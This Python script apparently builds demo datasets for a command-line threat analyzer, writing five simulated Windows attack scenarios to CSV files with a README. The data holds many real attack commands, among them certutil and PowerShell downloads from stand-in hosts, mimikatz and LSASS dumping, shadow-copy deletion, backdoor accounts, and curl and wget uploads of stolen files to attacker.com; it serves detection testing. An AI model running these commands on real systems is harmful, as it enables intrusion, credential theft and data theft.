"""
Demo Environment and Case Studies for Command Line Analyzer

This script creates a comprehensive demo environment with multiple case studies
showing how the command line analyzer can detect various attack scenarios.
"""

import pandas as pd
import json
from datetime import datetime, timedelta
import random
from pathlib import Path

def create_demo_environment():
    """Create a comprehensive demo environment with multiple case studies"""
    
    print("🚀 Creating Demo Environment for Command Line Analyzer")
    print("=" * 60)
    
    # Create sample data for different attack scenarios
    scenarios = {
        "ransomware_attack": create_ransomware_scenario(),
        "credential_theft": create_credential_theft_scenario(),
        "lateral_movement": create_lateral_movement_scenario(),
        "persistence_establishment": create_persistence_scenario(),
        "data_exfiltration": create_data_exfiltration_scenario()
    }
    
    # Save each scenario to a separate CSV file
    for scenario_name, data in scenarios.items():
        filename = f"demo_{scenario_name}.csv"
        df = pd.DataFrame(data)
        df.to_csv(filename, index=False)
        print(f"✅ Created {filename} with {len(df)} command entries")
    
    # Create a combined dataset
    combined_data = []
    for scenario_name, data in scenarios.items():
        for entry in data:
            entry['scenario'] = scenario_name
            combined_data.append(entry)
    
    combined_df = pd.DataFrame(combined_data)
    combined_df.to_csv("demo_combined_scenario.csv", index=False)
    print(f"✅ Created demo_combined_scenario.csv with {len(combined_df)} total command entries")
    
    # Create a README with case study descriptions
    create_readme(scenarios)
    
    print("\n🎯 Demo Environment Ready!")
    print("Files created:")
    for scenario_name in scenarios.keys():
        print(f"  - demo_{scenario_name}.csv")
    print("  - demo_combined_scenario.csv")
    print("  - demo_README.md")
    

def create_ransomware_scenario():
    """Create a ransomware attack scenario"""
    commands = [
        # Reconnaissance phase
        {"commandline": "systeminfo"},
        {"commandline": "net config workstation"},
        {"commandline": "net view"},
        {"commandline": "dir C:\\Users\\"},
        {"commandline": "wmic logicaldisk get size,freespace,caption"},
        
        # Privilege escalation preparation
        {"commandline": "whoami /all"},
        {"commandline": "net localgroup administrators"},
        {"commandline": "accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula"},
        
        # Persistence establishment
        {"commandline": "net user ransomuser StrongPass123! /add"},
        {"commandline": "net localgroup administrators ransomuser /add"},
        {"commandline": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Ransomware /t REG_SZ /d \"C:\\temp\\encrypt.exe\" /f"},
        
        # Defense evasion
        {"commandline": "sc stop WinDefend"},
        {"commandline": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"},
        {"commandline": "vssadmin delete shadows /all /quiet"},
        {"commandline": "bcdedit /set {default} recoveryenabled No"},
        {"commandline": "bcdedit /set {default} bootstatuspolicy ignoreallfailures"},
        
        # Data encryption preparation
        {"commandline": "net use Z: \\\\server\\shared_folder /user:domain\\user password"},
        {"commandline": "powershell -Command \"Get-ChildItem -Path C:\\ -Include *.docx,*.pdf,*.xls,*.xlsx,*.ppt,*.pptx -Recurse | Select-Object FullName\""},
        
        # Payload delivery and execution
        {"commandline": "certutil.exe -urlcache -split -f \"http://malicious.com/ransomware.exe\" C:\\temp\\encrypt.exe"},
        {"commandline": "C:\\temp\\encrypt.exe --encrypt-all"},
        {"commandline": "del C:\\temp\\encrypt.exe"},
        
        # Covering tracks
        {"commandline": "wevtutil cl System"},
        {"commandline": "wevtutil cl Security"},
        {"commandline": "wevtutil cl Application"}
    ]
    
    return commands


def create_credential_theft_scenario():
    """Create a credential theft scenario"""
    commands = [
        # Reconnaissance
        {"commandline": "tasklist"},
        {"commandline": "net user"},
        {"commandline": "net accounts"},
        {"commandline": "qwinsta"},
        {"commandline": "query user"},
        
        # Credential dumping
        {"commandline": "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/mimikatz.ps1'); Invoke-Mimikatz -Command '\"\"privilege::debug\"\" \"\"sekurlsa::logonpasswords\"\"'\""},
        {"commandline": "procdump.exe -accepteula -ma lsass.exe C:\\temp\\lsass.dmp"},
        {"commandline": "mimikatz.exe \"privilege::debug\" \"sekurlsa::minidump C:\\temp\\lsass.dmp\" \"sekurlsa::logonpasswords full\" exit"},
        
        # Registry credential access
        {"commandline": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\""},
        {"commandline": "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v Security Packages"},
        {"commandline": "reg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\""},
        
        # SAM/SYSTEM extraction
        {"commandline": "reg save HKLM\\SAM C:\\temp\\sam.hive"},
        {"commandline": "reg save HKLM\\SYSTEM C:\\temp\\system.hive"},
        {"commandline": "reg save HKLM\\SECURITY C:\\temp\\security.hive"},
        
        # Browser credential theft
        {"commandline": "powershell -ep bypass -c \"Get-Process | Where-Object {$_.ProcessName -like '*chrome*'} | ForEach-Object {Stop-Process $_.Id}\""},
        {"commandline": "copy \"C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\" C:\\temp\\chrome_logins"},
        {"commandline": "copy \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*.default\\logins.json\" C:\\temp\\firefox_logins"},
        
        # Network credential harvesting
        {"commandline": "netsh wlan show profiles"},
        {"commandline": "netsh wlan show profile name=\"CorporateWiFi\" key=clear"},
        {"commandline": "nltest /domain_trusts"},
        {"commandline": "nltest /dsgetdc:DOMAIN.LOCAL"}
    ]
    
    return commands


def create_lateral_movement_scenario():
    """Create a lateral movement scenario"""
    commands = [
        # Network reconnaissance
        {"commandline": "ipconfig /all"},
        {"commandline": "arp -a"},
        {"commandline": "net view"},
        {"commandline": "nbtstat -A 192.168.1.10"},
        {"commandline": "net group \"domain computers\" /domain"},
        
        # Service enumeration
        {"commandline": "net use z: \\\\target-server\\c$ /user:domain\\validuser ValidPass123!"},
        {"commandline": "sc query \\\\target-server"},
        {"commandline": "wmic /node:\"target-server\" service where (state=\"running\") get name"},
        
        # Lateral movement via PsExec
        {"commandline": "psexec.exe \\\\target-server -u domain\\adminuser -p AdminPass123! cmd.exe"},
        {"commandline": "psexec.exe \\\\target-server -s cmd.exe"},
        {"commandline": "psexec.exe \\\\fileserver -u domain\\service_account -p ServicePass123! -c malware.exe"},
        
        # WMI-based movement
        {"commandline": "wmic /node:\"webserver\" /user:\"domain\\adminuser\" /password:\"AdminPass123!\" process call create \"cmd.exe /c powershell -ep bypass -f \\\\share\\backdoor.ps1\""},
        {"commandline": "wmic /node:\"dbserver\" process call create \"cmd.exe /c net user hacker Pass123! /add && net localgroup administrators hacker /add\""},
        
        # Scheduled task lateral movement
        {"commandline": "schtasks /create /S target-server /RU \"SYSTEM\" /SC ONSTART /TN \"Update\" /TR \"powershell -ep bypass -f \\\\share\\payload.ps1\""},
        {"commandline": "schtasks /run /S target-server /I /TN \"Update\""},
        
        # PowerShell remoting
        {"commandline": "powershell Enable-PSRemoting -Force"},
        {"commandline": "powershell Invoke-Command -ComputerName target-server -ScriptBlock {whoami} -Credential domain\\adminuser"},
        {"commandline": "powershell Enter-PSSession -ComputerName target-server -Credential domain\\adminuser"},
        
        # Pass-the-hash
        {"commandline": "sekurlsa::pth /user:adminuser /domain:domain.local /ntlm:hash_value /run:cmd.exe"},
        
        # SMB signing bypass
        {"commandline": "crackmapexec smb 192.168.1.0/24 -u adminuser -p AdminPass123! --shares"},
        {"commandline": "crackmapexec smb 192.168.1.0/24 -u adminuser -H hash_value --sam"}
    ]
    
    return commands


def create_persistence_scenario():
    """Create a persistence establishment scenario"""
    commands = [
        # Create backdoor user
        {"commandline": "net user backdooruser BackdoorPass123! /add"},
        {"commandline": "net localgroup administrators backdooruser /add"},
        {"commandline": "net localgroup \"remote desktop users\" backdooruser /add"},
        
        # Registry persistence
        {"commandline": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Backdoor /t REG_SZ /d \"C:\\ProgramData\\backdoor.exe\" /f"},
        {"commandline": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v SystemService /t REG_SZ /d \"C:\\Windows\\system32\\svchost.exe\" /f"},
        {"commandline": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe,C:\\temp\\backdoor.exe\" /f"},
        
        # Scheduled task persistence
        {"commandline": "schtasks /create /tn \"WindowsOptimizer\" /tr \"C:\\temp\\backdoor.exe\" /sc daily /st 02:00 /ru \"SYSTEM\""},
        {"commandline": "schtasks /create /tn \"SecurityScan\" /tr \"powershell -WindowStyle Hidden -Exec Bypass -File C:\\temp\\payload.ps1\" /sc onstart /ru \"SYSTEM\""},
        
        # Service persistence
        {"commandline": "sc create BackdoorService binPath= \"C:\\temp\\backdoor.exe\" start= auto"},
        {"commandline": "sc config BackdoorService start= auto"},
        {"commandline": "sc start BackdoorService"},
        
        # WMI event subscription
        {"commandline": "wmic /Namespace:(root\\Subscription) PATH __EventFilter CREATE Name=\"Updater\", EventNameSpace=\"root\\cimv2\", QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 320\""},
        
        # DLL hijacking
        {"commandline": "copy malicious.dll \"C:\\Program Files\\LegitimateApp\\\""},
        {"commandline": "copy legitimate.exe \"C:\\Program Files\\LegitimateApp\\legitimate.exe\""},
        
        # Startup folder persistence
        {"commandline": "copy backdoor.exe \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\""},
        {"commandline": "copy payload.lnk \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\\""},
        
        # Image File Execution Options injection
        {"commandline": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe\" /v Debugger /t REG_SZ /d \"C:\\temp\\backdoor.exe\" /f"},
        
        # Bootkit/MBR infection preparation
        {"commandline": "bootrec /fixmbr"},
        {"commandline": "bootrec /fixboot"},
        {"commandline": "attrib -h -r -s C:\\bootmgr"},
        {"commandline": "copy malicious_bootmgr C:\\bootmgr"}
    ]
    
    return commands


def create_data_exfiltration_scenario():
    """Create a data exfiltration scenario"""
    commands = [
        # Data discovery
        {"commandline": "dir C:\\Users\\ /s /b | findstr \"*.pdf *.doc *.docx *.xls *.xlsx *.ppt *.pptx *.txt *.rtf\""},
        {"commandline": "powershell -Command \"Get-ChildItem -Path C:\\ -Include *.pdf,*.doc*,*.xls*,*.ppt*,*.txt -Recurse | Where-Object {$_.Length -gt 100KB}\""},
        {"commandline": "findstr /s /m \"confidential\" C:\\Users\\*.docx"},
        {"commandline": "findstr /s /m \"credit card\" C:\\Users\\*.txt"},
        
        # Database access
        {"commandline": "sqlcmd -S localhost -d master -Q \"SELECT name FROM sys.databases\""},
        {"commandline": "sqlcmd -S dbserver -d CustomerDB -Q \"SELECT TOP 10 * FROM Customers\""},
        {"commandline": "sqlcmd -S dbserver -d CustomerDB -Q \"SELECT SSN, CreditCardNumber FROM FinancialRecords\" -o C:\\temp\\db_dump.txt"},
        
        # Archive sensitive data
        {"commandline": "powershell Compress-Archive -Path \"C:\\Users\\Documents\\*.pdf\" -DestinationPath C:\\temp\\documents.zip"},
        {"commandline": "7z a -pstrong_password C:\\temp\\sensitive_data.7z C:\\Users\\*\\*.docx"},
        {"commandline": "tar -czf C:\\temp\\personal_data.tar.gz C:\\Users\\Public\\*"},
        
        # Encode data
        {"commandline": "certutil -encode C:\\temp\\sensitive_data.zip C:\\temp\\encoded_data.b64"},
        {"commandline": "powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\temp\\financial_records.xlsx'))\" > C:\\temp\\encoded_file.txt"},
        
        # Exfiltration preparation
        {"commandline": "net use Z: \\\\192.168.1.100\\exfil_share /user:anonymous password"},
        {"commandline": "netsh advfirewall firewall add rule name=\"AllowOutboundFTP\" dir=out action=allow protocol=TCP localport=21"},
        {"commandline": "netsh advfirewall firewall add rule name=\"AllowOutboundHTTP\" dir=out action=allow protocol=TCP localport=80"},
        
        # Data transfer methods
        {"commandline": "ftp -s:upload_script.txt 192.168.1.100"},
        {"commandline": "curl -X POST -F \"file=@C:\\temp\\documents.zip\" http://attacker.com/upload.php"},
        {"commandline": "powershell (New-Object System.Net.WebClient).UploadFile('http://attacker.com/upload.php', 'C:\\temp\\encoded_data.b64')"},
        {"commandline": "wget --post-file=C:\\temp\\db_dump.txt http://attacker.com/receive.php"},
        
        # DNS tunneling
        {"commandline": "dnscat2-client attacker.com --exec ping.exe"},
        {"commandline": "iodine -f -P password attacker.com"},
        
        # ICMP exfiltration
        {"commandline": "hping3 -c 10000 -d 100 -E C:\\temp\\data.txt -s 12345 -p 80 -k attacker.com"},
        
        # Steganography
        {"commandline": "copy /b image.jpg + C:\\temp\\sensitive_data.zip stego_image.jpg"},
        {"commandline": "outguess -k \"password\" -d C:\\temp\\compressed_data.txt stego_image.jpg"},
        
        # Cleanup
        {"commandline": "cipher /w:C:\\temp"},
        {"commandline": "sdelete -p 3 C:\\temp\\original_files\\*"},
        {"commandline": "fsutil file createnew C:\\temp\\dummy_file.dat 104857600 && del C:\\temp\\dummy_file.dat"}
    ]
    
    return commands


def create_readme(scenarios):
    """Create a README with descriptions of each scenario"""
    readme_content = """
# Command Line Analyzer - Demo Scenarios

This demo environment contains several realistic attack scenarios to test the command line analyzer's detection capabilities.

## Scenarios Included

### 1. Ransomware Attack (`demo_ransomware_attack.csv`)
This scenario simulates a ransomware attack lifecycle:
- **Reconnaissance**: System and network information gathering
- **Privilege Escalation**: Preparation for elevated access
- **Persistence**: Establishing backdoors and auto-start mechanisms
- **Defense Evasion**: Disabling security tools and clearing logs
- **Payload Delivery**: Downloading and executing encryption tools
- **Impact**: Encrypting files and demanding ransom

### 2. Credential Theft (`demo_credential_theft.csv`)
This scenario demonstrates credential harvesting techniques:
- **Reconnaissance**: Identifying users and processes
- **LSASS Dumps**: Extracting credentials from memory
- **Registry Access**: Retrieving stored passwords
- **Browser Theft**: Harvesting browser credentials
- **Network Credentials**: Extracting WiFi and domain credentials

### 3. Lateral Movement (`demo_lateral_movement.csv`)
This scenario shows techniques for moving through a network:
- **Network Reconnaissance**: Discovering hosts and services
- **PsExec Usage**: Remote command execution
- **WMI Attacks**: Using WMI for remote operations
- **Scheduled Tasks**: Leveraging scheduled tasks for movement
- **PowerShell Remoting**: Using PSRemoting for access
- **Pass-the-Hash**: Using credential hashes for authentication

### 4. Persistence Establishment (`demo_persistence_establishment.csv`)
This scenario demonstrates maintaining access:
- **Backdoor Users**: Creating new user accounts
- **Registry Persistence**: Using Run keys and other registry locations
- **Scheduled Tasks**: Creating persistent scheduled tasks
- **Services**: Installing malicious services
- **WMI Events**: Using WMI event subscriptions
- **Startup Folders**: Using startup folders for persistence

### 5. Data Exfiltration (`demo_data_exfiltration.csv`)
This scenario shows data theft techniques:
- **Data Discovery**: Finding sensitive files
- **Database Access**: Querying databases for sensitive information
- **Archiving**: Compressing sensitive data
- **Encoding**: Encoding data to evade detection
- **Transfer Methods**: Various exfiltration techniques
- **Steganography**: Hiding data in images

## How to Use

1. Run the analyzer on individual scenarios:
   ```bash
   python log_analyzer.py  # Modify INPUT_CSV_PATH to point to specific scenario
   ```

2. Or analyze the combined dataset:
   ```bash
   # Modify INPUT_CSV_PATH in log_analyzer.py to "demo_combined_scenario.csv"
   python log_analyzer.py
   ```

3. View results in the generated CSV and XLSX files

4. Use the dashboard to visualize findings:
   ```bash
   python -m streamlit run dashboard.py
   ```

## Expected Detection Rates

- Ransomware Attack: High (90-100% detection rate expected)
- Credential Theft: Very High (95-100% detection rate expected)
- Lateral Movement: High (85-95% detection rate expected)
- Persistence Establishment: High (90-100% detection rate expected)
- Data Exfiltration: Medium-High (75-90% detection rate expected)

The analyzer combines signature-based detection, behavioral analysis, and threat intelligence to identify malicious activities across these scenarios.
"""
    
    with open("demo_README.md", "w") as f:
        f.write(readme_content)
    
    print("✅ Created demo_README.md with scenario descriptions")


if __name__ == "__main__":
    create_demo_environment()